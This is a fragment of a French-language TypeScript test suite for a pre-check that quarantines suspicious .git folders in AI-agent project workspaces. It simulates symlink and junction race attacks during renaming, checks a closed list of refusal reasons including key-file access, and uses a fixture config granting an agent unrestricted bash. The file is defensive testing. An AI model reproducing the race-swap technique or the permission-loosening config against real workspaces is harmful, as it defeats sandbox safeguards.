    assert.deepEqual(await renommerSansSuivreLiens(projet, ".git-lien", "quarantaine"), { ok: false, raison: "lien-symbolique" });
    assert.equal(fs.existsSync(path.join(workspace, "dehors", ".git", "HEAD")), true, "rien ne doit avoir bougé hors du projet");
    assert.equal(fs.existsSync(path.join(projet, "quarantaine")), false);
  });

  // Relecture 2ter-vague-4 (constat L23c) : la salle tourne pendant la quarantaine. Un dossier du chemin remplacé par une jonction
  // vers un autre projet APRÈS les vérifications ne doit jamais faire renommer le .git protégé de cet autre projet.
  const HEAD_AUTRE = "ref: refs/heads/principale\n";
  const suspects = (dossier: string) => fs.readdirSync(dossier).filter((nom) => nom.startsWith(".git.suspect"));

  it("course : dossier du chemin remplacé par une jonction entre la vérification et le renommage → rien n'est renommé, ni dans l'autre projet ni dans le dossier déplacé", async (t) => {
    const workspace = atelier(t);
    poser(workspace, "PROJET/src/a/.git/HEAD", "ref: refs/heads/piege\n");
    poser(workspace, "AUTRE/.git/HEAD", HEAD_AUTRE);
    const echange = echangerParLienAuLstat(t, workspace, ".git.suspect", "PROJET/src/a", "AUTRE");
    const resultat = await renommerSansSuivreLiens(workspace, "PROJET/src/a/.git", ".git.suspect");
    assert.equal(echange.fait(), true, "l'échange doit avoir eu lieu pendant le renommage");
    assert.equal(resultat.ok, false, JSON.stringify(resultat));
    assert.equal(fs.readFileSync(path.join(workspace, "AUTRE", ".git", "HEAD"), "utf8"), HEAD_AUTRE, "le .git de l'autre projet reste en place");
    assert.deepEqual(suspects(path.join(workspace, "AUTRE")), [], "aucun renommage à travers la jonction");
    assert.ok(fs.existsSync(path.join(workspace, "PROJET", "src", "a-avant", ".git", "HEAD")), "le dossier déplacé n'est pas renommé non plus (son chemin a changé)");
  });

  it("course pendant la boucle des noms en collision (noms pris d'avance) : même refus, rien n'est renommé ni écrasé", async (t) => {
    const workspace = atelier(t);
    poser(workspace, "PROJET/src/a/.git/HEAD", "ref: refs/heads/piege\n");
    poser(workspace, "PROJET/src/a/.git.suspect/temoin.txt", "pris 1");
    poser(workspace, "PROJET/src/a/.git.suspect-2/temoin.txt", "pris 2");
    poser(workspace, "AUTRE/.git/HEAD", HEAD_AUTRE);
    const echange = echangerParLienAuLstat(t, workspace, ".git.suspect-3", "PROJET/src/a", "AUTRE");
    const resultat = await renommerSansSuivreLiens(workspace, "PROJET/src/a/.git", ".git.suspect");
    assert.equal(echange.fait(), true, "l'échange doit avoir eu lieu au troisième nom essayé");
    assert.equal(resultat.ok, false, JSON.stringify(resultat));
    assert.equal(fs.readFileSync(path.join(workspace, "AUTRE", ".git", "HEAD"), "utf8"), HEAD_AUTRE);
    assert.deepEqual(suspects(path.join(workspace, "AUTRE")), []);
    const deplace = path.join(workspace, "PROJET", "src", "a-avant");
    assert.ok(fs.existsSync(path.join(deplace, ".git", "HEAD")));
    assert.deepEqual(suspects(deplace).sort(), [".git.suspect", ".git.suspect-2"], "les noms pris restent intacts");
  });

  it("sans course : le dossier tenu jusqu'au renommage renomme bien, au premier nom libre", async (t) => {
    const workspace = atelier(t);
    poser(workspace, "PROJET/src/a/.git/HEAD", "ref: refs/heads/piege\n");
    poser(workspace, "PROJET/src/a/.git.suspect/temoin.txt", "pris");
    assert.deepEqual(await renommerSansSuivreLiens(workspace, "PROJET/src/a/.git", ".git.suspect"), { ok: true, nom: ".git.suspect-2" });
    assert.ok(fs.existsSync(path.join(workspace, "PROJET", "src", "a", ".git.suspect-2", "HEAD")));
    assert.equal(fs.readFileSync(path.join(workspace, "PROJET", "src", "a", ".git.suspect", "temoin.txt"), "utf8"), "pris");
  });
});

// --- T-L19-h : pureté des règles ------------------------------------------------------------------------------------------------------

describe("pureté du module de règles (T-L19-h)", () => {
  it("shared/omo-precheck-rules.ts n'a ni module node, ni process, et n'importe qu'un module voisin", () => {
    const source = fs.readFileSync(path.join(import.meta.dirname, "shared", "omo-precheck-rules.ts"), "utf8");
    assert.equal(source.includes('"node:'), false, "module node dans les règles");
    assert.equal(/\bprocess\./.test(source), false, "accès à process dans les règles");
    assert.equal(/\brequire\s*\(/.test(source), false, "require dans les règles");
    const imports = [...source.matchAll(/(?:\bfrom\s*|\bimport\s*\(?\s*)["']([^"']+)["']/g)].map((trouve) => trouve[1]);
    assert.deepEqual(imports, ["./assistant-rules.ts"]);
    // KEY_FILE_READ_RULES est repris tel quel : le pré-contrôle ne redéfinit aucun motif de lecture de clés.
    const regles = fs.readFileSync(path.join(import.meta.dirname, "shared", "assistant-rules.ts"), "utf8");
    assert.ok(regles.includes("export const KEY_FILE_READ_RULES"), "KEY_FILE_READ_RULES doit rester exporté");
  });

  it("les neuf raisons sont uniques et rangées comme la liste fermée du contrat", () => {
    assert.equal(OMO_PRECHECK_REASONS.length, 9);
    assert.equal(new Set(OMO_PRECHECK_REASONS).size, 9);
    assert.deepEqual([...OMO_PRECHECK_REASONS], [
      "config-extension",
      "config-opencode",
      "fichier-cle",
      "lien-symbolique",
      "illisible",
      "profondeur",
      "hors-workspace",
      "non-prepare",
      "empreinte-impossible",
    ]);
  });

  it("les règles ne lisent aucun contenu : deux projets au contenu différent mais aux mêmes noms sont jugés pareil", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "a");
    fabriquerProjet(workspace, "b");
    poser(workspace, "a/opencode.json", '{"agents": {"x": {"permission": {"bash": "allow"}}}}');
    poser(workspace, "b/opencode.json", "{}");
    const premier = await precontrolerProjet("a", { workspace });
    const second = await precontrolerProjet("b", { workspace });
    // F-z : une configuration de l'extension est refusée qu'elle assouplisse ou non les permissions.
    assert.equal(premier.raison, second.raison);
    assert.deepEqual(premier.trouves, second.trouves);
    assert.equal(crypto.createHash("sha256").update(JSON.stringify(premier.trouves)).digest("hex").length, 64);
  });
});
